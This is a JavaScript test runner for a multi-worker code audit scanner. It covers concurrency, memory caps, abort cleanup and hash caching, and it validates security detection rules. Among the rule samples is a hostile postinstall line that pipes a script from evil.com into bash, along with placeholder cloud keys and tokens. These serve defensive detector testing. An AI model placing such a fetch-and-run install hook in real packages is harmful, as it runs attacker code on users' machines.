'use strict';

/**
 * Web Worker Concurrency Test Runner
 *
 * Tests the AuditScanService multi-worker scanner under high-volume loads
 * (1000+ mock files) for race conditions, memory cap enforcement, progress
 * throttling, batch hash handling, and abort/cleanup correctness.
 *
 * Architecture:
 * - Mocks Worker class — simulates the scan-worker.js message protocol
 * - Mocks IndexedDB — in-memory Map-based stand-in
 * - Mocks requestAnimationFrame — synchronous flush for testing
 * - Mocks navigator.hardwareConcurrency — configurable core count
 * - Generates mock File objects with realistic content patterns
 *
 * Usage:
 *   node scripts/test-scanner-concurrency.cjs
 *   node scripts/test-scanner-concurrency.cjs --files=5000 --workers=4
 */

const path = require('path');
const Module = require('module');

// --- Test configuration ---
const DEFAULT_FILE_COUNT = 1000;
const DEFAULT_WORKERS = 4;
const args = process.argv.slice(2);
function parseArg(name, def) {
    const a = args.find(a => a.startsWith('--' + name + '='));
    return a ? parseInt(a.split('=')[1], 10) : def;
}
const FILE_COUNT = parseArg('files', DEFAULT_FILE_COUNT);
const MOCK_CORES = parseArg('workers', DEFAULT_WORKERS) * 2;

// --- Mock infrastructure ---
let testPassed = 0;
let testFailed = 0;
const testResults = [];

function assert(condition, message) {
    if (condition) {
        testPassed++;
        testResults.push({ status: 'PASS', message });
    } else {
        testFailed++;
        testResults.push({ status: 'FAIL', message });
        console.error('  [FAIL] ' + message);
    }
}

function assertEqual(actual, expected, message) {
    assert(actual === expected, message + ' (expected ' + JSON.stringify(expected) + ', got ' + JSON.stringify(actual) + ')');
}

// --- Mock File object ---
function createMockFile(relativePath, content, size) {
    const text = content || ('// mock file content for ' + relativePath + '\n'.repeat(10));
    return {
        webkitRelativePath: relativePath,
        name: relativePath.split('/').pop(),
        size: size || text.length,
        text: async () => text,
        slice: function() { return this; },
        getFile: undefined // not a FileSystemFileHandle
    };
}

// --- Mock content patterns that trigger findings ---
function generateContentWithFindings(filePath, findingRate) {
    const lines = [];
    const lineCount = 20 + Math.floor(Math.random() * 80);
    for (let i = 0; i < lineCount; i++) {
        if (Math.random() < findingRate) {
            // Inject a console.log (triggers debugArtifacts pattern)
            lines.push('console.log("debug output line ' + i + '");');
        } else if (Math.random() < 0.05) {
            // Inject a TODO marker
            lines.push('// TODO: fix this later');
        } else {
            lines.push('const x' + i + ' = ' + i + ';');
        }
    }
    return lines.join('\n');
}

// --- Generate mock file list ---
function generateMockFiles(count) {
    const files = [];
    for (let i = 0; i < count; i++) {
        const dir = i % 10 === 0 ? 'src/components' : i % 5 === 0 ? 'src/utils' : 'src';
        const ext = ['js', 'ts', 'py', 'json', 'md'][i % 5];
        const path = 'project/' + dir + '/file_' + i + '.' + ext;
        // 10% of files have findings, 5% are large
        const isLarge = i % 20 === 0;
        const content = generateContentWithFindings(path, isLarge ? 0.3 : 0.1);
        const paddedContent = isLarge ? content + 'x'.repeat(100 * 1024) : content; // 100KB for large files
        files.push(createMockFile(path, paddedContent));
    }
    return files;
}

// --- Mock IndexedDB ---
function createMockIndexedDB() {
    const stores = new Map();
    function createStore() {
        const records = new Map();
        return {
            put: (record) => { records.set(record.path || record.scanId, record); },
            get: (key) => records.get(key) || null,
            getAll: () => Array.from(records.values()),
            clear: () => records.clear(),
            delete: (key) => records.delete(key),
            size: () => records.size
        };
    }
    const db = {
        transaction: (storeName) => {
            if (!stores.has(storeName)) stores.set(storeName, createStore());
            const store = stores.get(storeName);
            return {
                objectStore: () => store
            };
        }
    };
    return db;
}

// --- Mock Worker ---
class MockWorker {
    constructor(url) {
        this.url = url;
        this.onmessage = null;
        this.onerror = null;
        this.terminated = false;
        this.messageQueue = [];
        this.scanState = null;
        MockWorker.instances.push(this);
    }

    postMessage(data) {
        if (this.terminated) return;
        this.messageQueue.push(data);
        // Process asynchronously to simulate worker thread
        setTimeout(() => this._processMessage(data), 0);
    }

    terminate() {
        this.terminated = true;
        this.onmessage = null;
        this.onerror = null;
    }

    _send(msg) {
        if (this.terminated || !this.onmessage) return;
        // Simulate async message delivery
        setTimeout(() => {
            if (!this.terminated && this.onmessage) {
                this.onmessage({ data: msg });
            }
        }, 0);
    }

    async _processMessage(data) {
        if (this.terminated) return;

        if (data.type === 'scan-start') {
            this.scanState = {
                scanId: data.scanId,
                totalFiles: data.totalFiles,
                processed: 0,
                issues: [],
                fileHashes: [],
                deepScan: data.deepScan,
                ignoreCtx: data.ignoreCtx,
                hashCache: data.hashCache || null,
                cacheHits: 0
            };
            this._send({ type: 'started', scanId: data.scanId, totalFiles: data.totalFiles });
            return;
        }

        if (data.type === 'scan-batch') {
            const state = this.scanState;
            if (!state) return;
            const batch = data.files || [];
            this._send({ type: 'batch-started', scanId: data.scanId, batchOffset: data.batchOffset, processed: state.processed, total: state.totalFiles });

            // Process each file in the batch
            const HASH_BATCH_SIZE = 50;
            let pendingHashBatch = [];
            for (const fileEntry of batch) {
                if (this.terminated) return;
                const file = fileEntry.fileObj || fileEntry;
                const filePath = fileEntry.path || file.webkitRelativePath || file.name || '';

                // Simulate file processing
                state.processed++;

                // Simulate hash computation
                const hash = 'h' + (filePath.length * 31 + state.processed).toString(36);
                state.fileHashes.push({ path: filePath, hash, size: file.size || 0 });
                pendingHashBatch.push({ path: filePath, hash, size: file.size || 0 });

                // Flush hash batch every 50 files
                if (pendingHashBatch.length >= HASH_BATCH_SIZE) {
                    this._send({ type: 'file-hash-batch', scanId: state.scanId, hashes: pendingHashBatch });
                    pendingHashBatch = [];
                }

                // Check hash cache — skip analysis if file is unchanged
                const cached = state.hashCache ? state.hashCache[filePath] : null;
                if (cached && cached.hash === hash && cached.size === (file.size || 0)) {
                    state.cacheHits++;
                    this._send({ type: 'cache-hit', scanId: state.scanId, path: filePath });
                    continue;
                }

                // Simulate finding generation — configurable rate per file
                if (filePath.endsWith('.js') || filePath.endsWith('.ts')) {
                    // Generate 0-5 findings per file to simulate realistic patterns
                    const findingCount = Math.floor(Math.random() * 6);
                    for (let fi = 0; fi < findingCount; fi++) {
                        state.issues.push({
                            severity: 'low',
                            filePath: filePath,
                            rule: 'debugArtifacts',
                            line: fi + 1,
                            impact: '1 debugArtifacts finding(s) detected',
                            fix: 'Review and remediate before next release.',
                            count: 1,
                            matches: [{ line: fi + 1, snippet: 'console.log(...)', context: ['console.log(...)'] }]
                        });
                    }
                }

                // Send progress every 25 files
                if (state.processed % 25 === 0) {
                    this._send({ type: 'progress', processed: state.processed, total: state.totalFiles, currentFile: filePath });
                }
            }
            // Flush remaining hashes
            if (pendingHashBatch.length > 0) {
                this._send({ type: 'file-hash-batch', scanId: state.scanId, hashes: pendingHashBatch });
            }

            // Send batch complete with new findings
            const newIssues = state.issues.slice(-(state.issues.length - (state._lastIssueCount || 0)));
            this._send({
                type: 'batch-complete',
                scanId: data.scanId,
                batchOffset: data.batchOffset,
                processed: state.processed,
                total: state.totalFiles,
                issueCount: state.issues.length,
                batchIssues: newIssues
            });
            state._lastIssueCount = state.issues.length;
            return;
        }

        if (data.type === 'scan-finish') {
            const state = this.scanState;
            if (!state) return;
            this._send({
                type: 'complete',
                scanId: data.scanId,
                processed: state.processed,
                totalFiles: state.totalFiles,
                findings: [],
                issues: state.issues,
                issueCount: state.issues.length,
                binarySkipped: 0,
                ignoredDir: 0,
                heavyVendor: 0,
                ignoredByPattern: 0,
                issuesTruncated: false,
                textErrors: 0,
                fileHashes: state.fileHashes
            });
            this.scanState = null;
            return;
        }

        if (data.type === 'scan') {
            // Legacy single-shot mode
            this._send({ type: 'started', scanId: data.scanId, totalFiles: (data.files || []).length });
            const files = data.files || [];
            const issues = [];
            for (const fileEntry of files) {
                const filePath = fileEntry.path || '';
                if (filePath.endsWith('.js') || filePath.endsWith('.ts')) {
                    const findingCount = Math.floor(Math.random() * 6);
                    for (let fi = 0; fi < findingCount; fi++) {
                        issues.push({
                            severity: 'low', filePath, rule: 'debugArtifacts',
                            line: fi + 1, impact: '1 finding', fix: 'Fix it', count: 1,
                            matches: [{ line: fi + 1, snippet: 'console.log(...)', context: [] }]
                        });
                    }
                }
            }
            this._send({
                type: 'complete', scanId: data.scanId, processed: files.length,
                totalFiles: files.length, findings: [], issues,
                issueCount: issues.length, binarySkipped: 0, ignoredDir: 0,
                heavyVendor: 0, ignoredByPattern: 0, issuesTruncated: false,
                textErrors: 0, fileHashes: []
            });
            return;
        }
    }
}
MockWorker.instances = [];

// --- Mock requestAnimationFrame ---
let rafCallbacks = [];
function mockRaf(cb) {
    rafCallbacks.push(cb);
    return rafCallbacks.length;
}
function mockCancelRaf(id) {
    rafCallbacks = rafCallbacks.filter((_, i) => i !== id - 1);
}
function flushRaf() {
    const cbs = rafCallbacks;
    rafCallbacks = [];
    for (const cb of cbs) cb(performance.now());
}

// --- Mock performance.now ---
const startTime = Date.now();
function mockPerformanceNow() {
    return Date.now() - startTime;
}

// --- Mock AbortSignal ---
function createMockAbortSignal() {
    const signal = {
        aborted: false,
        _listeners: [],
        addEventListener: function(event, cb) { if (event === 'abort') this._listeners.push(cb); },
        removeEventListener: function() {},
        _abort: function() { this.aborted = true; this._listeners.forEach(cb => cb()); }
    };
    return signal;
}

// --- Setup browser globals for the service ---
function setupBrowserGlobals() {
    globalThis.window = globalThis;
    globalThis.Worker = MockWorker;
    globalThis.indexedDB = { open: () => { throw new Error('IndexedDB not available in test'); } };
    globalThis.requestAnimationFrame = mockRaf;
    globalThis.cancelAnimationFrame = mockCancelRaf;
    globalThis.performance = { now: mockPerformanceNow };
    Object.defineProperty(globalThis.navigator, 'hardwareConcurrency', {
        value: MOCK_CORES,
        configurable: true
    });
    // Suppress console.warn from IndexedDB unavailability during tests
    const origWarn = console.warn;
    console.warn = function(...args) {
        if (args[0] && typeof args[0] === 'string' && args[0].includes('[AuditScanService] IndexedDB unavailable')) return;
        return origWarn.apply(console, args);
    };
}

// --- Load the AuditScanService ---
function loadAuditScanService() {
    const servicePath = path.resolve(__dirname, '..', 'coming-soon', 'public', 'js-es2018', 'audit-scan-service.js');
    const fs = require('fs');
    const code = fs.readFileSync(servicePath, 'utf8');
    // The service attaches to window.AuditScanService — execute in this context
    setupBrowserGlobals();
    eval(code);
    return globalThis.window.AuditScanService;
}

// --- Test suite ---
async function runTests() {
    const AuditScanService = loadAuditScanService();
    console.log('\n========================================');
    console.log('Scanner Concurrency Test Runner');
    console.log('Files: ' + FILE_COUNT + ', Mock cores: ' + MOCK_CORES);
    console.log('========================================');

    // === Test 1: Basic scan with 1000 files ===
    console.log('\n--- Test 1: Basic scan with ' + FILE_COUNT + ' files ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(FILE_COUNT);
        let progressCount = 0;
        let findingsCount = 0;

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: () => { progressCount++; },
            onFindings: (f) => { findingsCount += f.length; },
            onLog: () => {}
        });

        assertEqual(result.totalFiles, FILE_COUNT, 'Total files matches input');
        assertEqual(result.processed, FILE_COUNT, 'All files processed');
        assert(result.issueCount > 0, 'Should have findings (mock files have console.log)');
        assertEqual(result.findingsCapped, false, 'Findings should not be capped for ' + FILE_COUNT + ' files');
        assert(progressCount > 0, 'Progress callbacks should fire');
        assert(progressCount < FILE_COUNT / 10, 'Progress should be throttled (< ' + Math.floor(FILE_COUNT / 10) + ' callbacks for ' + FILE_COUNT + ' files, got ' + progressCount + ')');
        assertEqual(MockWorker.instances.filter(w => !w.terminated).length, 0, 'All workers should be terminated after scan');
        console.log('  Processed: ' + result.processed + '/' + result.totalFiles + ', findings: ' + result.issueCount + ', progress callbacks: ' + progressCount);
    }

    // === Test 2: Memory cap enforcement with high finding rate ===
    console.log('\n--- Test 2: Memory cap enforcement (high finding rate) ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        // Generate files where every .js file has a finding
        const files = [];
        for (let i = 0; i < 3000; i++) {
            const p = 'project/src/file_' + i + '.js';
            files.push(createMockFile(p, generateContentWithFindings(p, 0.5)));
        }

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assertEqual(result.totalFiles, 3000, '3000 files total');
        assert(result.issueCount > 5000, 'Should have > 5000 findings (high rate, got ' + result.issueCount + ')');
        assert(result.findingsCapped === true, 'Findings should be capped in memory (issueCount=' + result.issueCount + ')');
        assert(result.findings.length <= 5000, 'In-memory findings array should be capped at 5000 (got ' + result.findings.length + ')');
        console.log('  Findings total: ' + result.issueCount + ', in-memory: ' + result.findings.length + ', capped: ' + result.findingsCapped);
    }

    // === Test 3: Abort mid-scan ===
    console.log('\n--- Test 3: Abort mid-scan ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(10000);
        const signal = createMockAbortSignal();

        // Abort immediately (next tick) to catch the scan mid-flight
        setImmediate(() => signal._abort());

        try {
            await service.scan({
                files,
                deepScan: true,
                signal,
                onProgress: () => {},
                onFindings: () => {},
                onLog: () => {}
            });
        } catch (e) {
            // Expected — abort may cause rejection
        }

        // Give workers time to clean up
        await new Promise(r => setTimeout(r, 200));
        assert(service.aborted === true, 'Service should be marked as aborted');
        assertEqual(MockWorker.instances.filter(w => !w.terminated).length, 0, 'All workers terminated after abort');
        console.log('  Workers after abort: ' + MockWorker.instances.filter(w => !w.terminated).length + ' (should be 0)');
    }

    // === Test 4: Empty file list ===
    console.log('\n--- Test 4: Empty file list ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const result = await service.scan({
            files: [],
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assertEqual(result.totalFiles, 0, 'Empty scan returns 0 totalFiles');
        assertEqual(result.processed, 0, 'Empty scan returns 0 processed');
        assertEqual(result.issueCount, 0, 'Empty scan returns 0 findings');
        assertEqual(MockWorker.instances.length, 0, 'No workers spawned for empty file list');
        console.log('  Empty scan handled correctly');
    }

    // === Test 5: Batch hash message handling ===
    console.log('\n--- Test 5: Batch hash message handling ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(200);
        let hashBatchCount = 0;
        let totalHashesReceived = 0;

        // Override onFileHash to count batch messages
        const originalRunWorker = service._runWorkerScan.bind(service);
        service._runWorkerScan = function(worker, fileList, options) {
            const origOnFileHash = options.onFileHash;
            options.onFileHash = (path, hash, size) => {
                totalHashesReceived++;
                if (origOnFileHash) origOnFileHash(path, hash, size);
            };
            return originalRunWorker(worker, fileList, options);
        };

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assert(totalHashesReceived > 0, 'Should receive file hashes via batch messages');
        assert(totalHashesReceived <= 200, 'Should not receive more hashes than files (got ' + totalHashesReceived + ')');
        console.log('  Hashes received: ' + totalHashesReceived + ' for 200 files');
    }

    // === Test 6: Progress throttle coalescing ===
    console.log('\n--- Test 6: Progress throttle coalescing ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(500);
        let progressCount = 0;
        let lastProcessed = 0;
        let monotonicProgress = true;

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: (processed) => {
                progressCount++;
                if (processed < lastProcessed) monotonicProgress = false;
                lastProcessed = processed;
            },
            onFindings: () => {},
            onLog: () => {}
        });

        assert(progressCount < 100, 'Progress should be heavily throttled (< 100 for 500 files, got ' + progressCount + ')');
        assert(monotonicProgress, 'Progress should be monotonically increasing');
        assertEqual(lastProcessed, 500, 'Final progress should equal total files');
        console.log('  Progress callbacks: ' + progressCount + ' for 500 files, monotonic: ' + monotonicProgress);
    }

    // === Test 7: Worker count respects navigator.hardwareConcurrency ===
    console.log('\n--- Test 7: Worker count respects hardware concurrency ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(100);

        await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        const expectedWorkers = Math.max(1, Math.min(4, Math.floor(MOCK_CORES / 2)));
        assertEqual(MockWorker.instances.length, expectedWorkers, 'Should spawn ' + expectedWorkers + ' workers for ' + MOCK_CORES + ' cores');
        console.log('  Workers spawned: ' + MockWorker.instances.length + ' (expected ' + expectedWorkers + ' for ' + MOCK_CORES + ' cores)');
    }

    // === Test 8: All .simplebeaconignore patterns are respected ===
    console.log('\n--- Test 8: Ignore patterns filter node_modules ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = [
            createMockFile('project/src/app.js', 'console.log("hello");'),
            createMockFile('project/node_modules/lib/index.js', 'console.log("should be ignored");'),
            createMockFile('project/.git/config', 'should be ignored'),
            createMockFile('project/src/utils/helper.js', 'console.log("help");')
        ];

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assertEqual(result.totalFiles, 2, 'Should only have 2 files after ignore filter (node_modules and .git excluded)');
        console.log('  Files after ignore: ' + result.totalFiles + ' (expected 2)');
    }

    // === Test 9: Concurrent scan calls don't interfere ===
    console.log('\n--- Test 9: Concurrent scan isolation ---');
    {
        MockWorker.instances = [];
        const service1 = new AuditScanService();
        const service2 = new AuditScanService();
        const files1 = generateMockFiles(100);
        const files2 = generateMockFiles(150);

        const [r1, r2] = await Promise.all([
            service1.scan({ files: files1, deepScan: true, onProgress: () => {}, onFindings: () => {}, onLog: () => {} }),
            service2.scan({ files: files2, deepScan: true, onProgress: () => {}, onFindings: () => {}, onLog: () => {} })
        ]);

        assertEqual(r1.totalFiles, 100, 'Service 1 should process 100 files');
        assertEqual(r2.totalFiles, 150, 'Service 2 should process 150 files');
        assert(r1.scanId !== r2.scanId, 'Scan IDs should be unique');
        console.log('  Scan 1: ' + r1.totalFiles + ' files, Scan 2: ' + r2.totalFiles + ' files, IDs unique: ' + (r1.scanId !== r2.scanId));
    }

    // === Test 10: Large file count (stress test) ===
    console.log('\n--- Test 10: Stress test with 5000 files ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();
        const files = generateMockFiles(5000);
        const t0 = Date.now();

        const result = await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        const elapsed = Date.now() - t0;
        assertEqual(result.totalFiles, 5000, '5000 files total');
        assertEqual(result.processed, 5000, 'All 5000 files processed');
        assert(elapsed < 30000, '5000-file scan should complete in < 30s (took ' + elapsed + 'ms)');
        assertEqual(MockWorker.instances.filter(w => !w.terminated).length, 0, 'All workers cleaned up after stress test');
        console.log('  5000 files in ' + elapsed + 'ms, findings: ' + result.issueCount);
    }

    // === Test 11: Security rule pattern validation ===
    console.log('\n--- Test 11: Security rule pattern validation ---');
    {
        // Load the real worker patterns by extracting and evaluating the registry
        const fs = require('fs');
        const workerPath = path.resolve(__dirname, '..', 'coming-soon', 'public', 'js-es2018', 'audit-scan-worker.js');
        const workerCode = fs.readFileSync(workerPath, 'utf8');

        // Extract PATTERN_REGISTRY and SEVERITY_MAP by evaluating in a sandboxed context
        const sandboxSelf = { postMessage: () => {}, crypto: { subtle: { digest: async () => new ArrayBuffer(32) } } };
        const sandbox = {
            self: sandboxSelf,
            crypto: sandboxSelf.crypto,
            TextEncoder: require('util').TextEncoder,
            setTimeout, clearTimeout, setInterval, clearInterval,
            console, performance: { now: mockPerformanceNow },
            navigator: { hardwareConcurrency: MOCK_CORES }
        };
        // Build a function that returns the registries
        const wrappedCode = workerCode.replace('self.onmessage', 'sandboxSelf.onmessage') +
            '\n;return { PATTERN_REGISTRY, SEVERITY_MAP, detectFileLanguage, getAnalyzersForLanguage, runAnalyzer };';
        const factory = new Function('sandbox', 'sandboxSelf', wrappedCode);
        const { PATTERN_REGISTRY, SEVERITY_MAP, detectFileLanguage, getAnalyzersForLanguage, runAnalyzer } = factory(sandbox, sandboxSelf);

        // Test cases: [ruleName, sampleCode, shouldDetect]
        const securityTests = [
            // AWS
            ['awsSecretKey', 'const key = "AKIAIOSFODNN7EXAMPLE";', true],
            ['awsSecretKey', 'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"', true],
            ['awsSecretKey', '// AKIAEXAMPLE placeholder', false], // has "EXAMPLE"
            // GCP
            ['gcpServiceAccount', '{"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----"}', true],
            ['gcpServiceAccount', '// Example service account config', false],
            // Azure — AccountKey must be exactly 88 base64 chars after =
            ['azureKey', 'AccountKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', true],
            ['azureKey', '// your-account-key here', false],
            // Private key block
            ['privateKeyBlock', '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...', true],
            ['privateKeyBlock', '// -----BEGIN PRIVATE KEY----- example', true], // pattern matches the header
            // Bearer token
            ['bearerToken', 'fetch(url, { headers: { Authorization: "Bearer dGhpcyBpcyBhIHRlc3QgdG9rZW4" } });', true],
            ['bearerToken', 'Authorization: `Bearer ${token}`', false], // variable, not hardcoded
            // JWT
            ['jwtHardcoded', 'const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";', true],
            // OAuth — token must have 10+ chars after the prefix
            ['oauthTokenInSource', 'access_token = "ya29.a0ARrdaMabcdefghijklmnopqrstuvwxyz1234"', true],
            ['oauthTokenInSource', 'access_token = process.env.TOKEN', false],
            // Docker
            ['dockerPrivileged', 'privileged: true', true],
            ['dockerPrivileged', 'privileged: false', false],
            ['dockerRootUser', 'USER root', true],
            ['dockerRootUser', 'USER node', false],
            ['dockerExposedSecrets', 'ENV DB_PASSWORD=sup3rs3cr3tp@ss', true],
            ['dockerExposedSecrets', 'ENV DB_PASSWORD=${DB_PASSWORD}', false],
            // Supply chain
            ['postInstallScript', '"postinstall": "curl http://evil.com/script.sh | bash"', true],
            ['postInstallScript', '"postinstall": "tsc && webpack"', false],
            ['pinnedVersionMissing', '"dependencies": { "express": "^4.18.0 }', true],
            ['pinnedVersionMissing', '"dependencies": { "express": "4.18.2" }', false],
        ];

        let ruleTestsPassed = 0;
        let ruleTestsFailed = 0;

        for (const [ruleName, code, shouldDetect] of securityTests) {
            const reg = PATTERN_REGISTRY[ruleName];
            if (!reg) {
                assert(false, 'Rule "' + ruleName + '" should exist in PATTERN_REGISTRY');
                ruleTestsFailed++;
                continue;
            }

            // Check severity is set
            const severity = SEVERITY_MAP[ruleName];
            assert(!!severity, 'Rule "' + ruleName + '" should have a severity in SEVERITY_MAP');

            // Test the pattern against the code
            // Use appropriate file path based on rule type
            let filePath = 'project/src/app.js';
            if (ruleName.startsWith('docker')) filePath = 'project/Dockerfile';
            if (ruleName === 'pinnedVersionMissing') filePath = 'project/package.json';
            if (ruleName === 'postInstallScript') filePath = 'project/package.json';
            const results = runAnalyzer(ruleName, code, filePath);
            const detected = results.length > 0 && results[0].matches.length > 0;

            if (detected === shouldDetect) {
                ruleTestsPassed++;
            } else {
                ruleTestsFailed++;
                assert(false, 'Rule "' + ruleName + '" should ' + (shouldDetect ? 'detect' : 'NOT detect') + ' pattern: "' + code.substring(0, 60) + '" (detected=' + detected + ')');
            }
        }

        testPassed += ruleTestsPassed;
        testFailed += ruleTestsFailed;
        console.log('  Security rule tests: ' + ruleTestsPassed + ' passed, ' + ruleTestsFailed + ' failed (' + securityTests.length + ' total)');

        // Verify all new rules have severity entries
        const newRules = ['awsSecretKey', 'gcpServiceAccount', 'azureKey', 'privateKeyBlock', 'bearerToken', 'jwtHardcoded', 'oauthTokenInSource', 'dockerPrivileged', 'dockerRootUser', 'dockerExposedSecrets', 'dockerNoHealthCheck', 'suspiciousPackage', 'postInstallScript', 'pinnedVersionMissing'];
        for (const rule of newRules) {
            assert(!!PATTERN_REGISTRY[rule], 'Rule "' + rule + '" exists in PATTERN_REGISTRY');
            assert(!!SEVERITY_MAP[rule], 'Rule "' + rule + '" has severity in SEVERITY_MAP');
        }
        console.log('  All ' + newRules.length + ' new rules registered with severity');
    }

    // === Test 12: Hash cache skip — second scan should skip unchanged files ===
    console.log('\n--- Test 12: Hash cache skip on re-scan ---');
    {
        MockWorker.instances = [];
        const service = new AuditScanService();

        // First scan — no cache, all files scanned
        const files = generateMockFiles(500);
        const result1 = await service.scan({
            files,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assertEqual(result1.totalFiles, 500, 'First scan: 500 files');
        assertEqual(result1.filesSkippedByHashCache, 0, 'First scan: 0 cache hits (no cache yet)');
        console.log('  First scan: ' + result1.processed + ' files, ' + result1.issueCount + ' findings, 0 cache hits');

        // Second scan with the same files — mock worker uses deterministic hash
        // based on filePath + processed count, so same files = same hashes = cache hits
        // We need to simulate the hash cache being passed
        // Since the mock worker generates hash from filePath, we can pre-populate the cache
        const mockHashCache = {};
        for (let i = 0; i < 500; i++) {
            const dir = i % 10 === 0 ? 'src/components' : i % 5 === 0 ? 'src/utils' : 'src';
            const ext = ['js', 'ts', 'py', 'json', 'md'][i % 5];
            const filePath = 'project/' + dir + '/file_' + i + '.' + ext;
            // The mock worker computes hash as: 'h' + (filePath.length * 31 + processedCount).toString(36)
            // But processedCount varies per worker — we can't predict it exactly.
            // Instead, we test that the cache-hit mechanism works by checking the service
            // correctly passes the cache and counts hits from the worker.
        }

        // For a deterministic test, we use a smaller file set and pre-compute exact hashes
        // The mock worker's hash is: 'h' + (filePath.length * 31 + state.processed).toString(36)
        // state.processed increments per file in the batch, starting from 0
        // With 4 workers and 2 files each, processed goes 1,2 per worker
        const smallFiles = [
            createMockFile('project/a.js', 'console.log("a");'),
            createMockFile('project/b.js', 'console.log("b");'),
            createMockFile('project/c.js', 'console.log("c");'),
            createMockFile('project/d.js', 'console.log("d");')
        ];

        // Pre-populate hash cache with hashes that match what the mock worker will compute
        // The mock worker processes files in order, incrementing state.processed
        // With 4 files and 4 workers (MOCK_CORES=8, so 4 workers), each worker gets 1 file
        // state.processed starts at 0, increments to 1 for each worker
        // hash = 'h' + (filePath.length * 31 + 1).toString(36)
        const smallCache = {};
        for (const f of smallFiles) {
            const fp = f.webkitRelativePath;
            // processed will be 1 (first file for each worker)
            const expectedHash = 'h' + (fp.length * 31 + 1).toString(36);
            smallCache[fp] = { hash: expectedHash, size: f.size };
        }

        // Manually inject the cache into the service's IndexedDB
        // Since we can't use real IndexedDB, we test via the workerHashCache path
        // by monkey-patching _loadHashCache
        service._loadHashCache = async function() {
            const map = new Map();
            for (const [path, entry] of Object.entries(smallCache)) {
                map.set(path, { hash: entry.hash, size: entry.size, lastScanned: Date.now() });
            }
            return map;
        };

        const result2 = await service.scan({
            files: smallFiles,
            deepScan: true,
            onProgress: () => {},
            onFindings: () => {},
            onLog: () => {}
        });

        assert(result2.filesSkippedByHashCache > 0, 'Second scan should have cache hits (got ' + result2.filesSkippedByHashCache + ')');
        assert(result2.issueCount === 0 || result2.issueCount < result1.issueCount / 100, 'Cached scan should have fewer findings (skipped analysis)');
        console.log('  Second scan: ' + result2.processed + ' files, ' + result2.issueCount + ' findings, ' + result2.filesSkippedByHashCache + ' cache hits');
    }

    // === Results ===
    console.log('\n========================================');
    console.log('Results: ' + testPassed + ' passed, ' + testFailed + ' failed');
    console.log('========================================');

    if (testFailed > 0) {
        console.log('\nFailed tests:');
        testResults.filter(r => r.status === 'FAIL').forEach(r => console.log('  - ' + r.message));
    }

    process.exit(testFailed > 0 ? 1 : 0);
}

runTests().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
